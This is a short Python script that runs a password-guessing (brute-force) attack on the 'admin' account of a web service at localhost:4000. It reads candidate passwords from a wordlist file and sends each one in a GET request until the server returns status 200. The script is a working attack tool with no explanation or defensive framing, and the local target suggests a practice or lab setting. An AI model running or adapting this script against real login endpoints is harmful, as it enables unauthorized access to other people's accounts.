import requests

username = 'admin'
url = 'http://localhost:4000/users'

with open('passwrods.txt', 'r') as file:
    passwords = file.readlines()

for password in passwords:
    password = password.strip()
    response = requests.get(url, params={'login': username, 'pass': password})

    if response.status_code == 200:
        print(f'Password found: {password}')
        break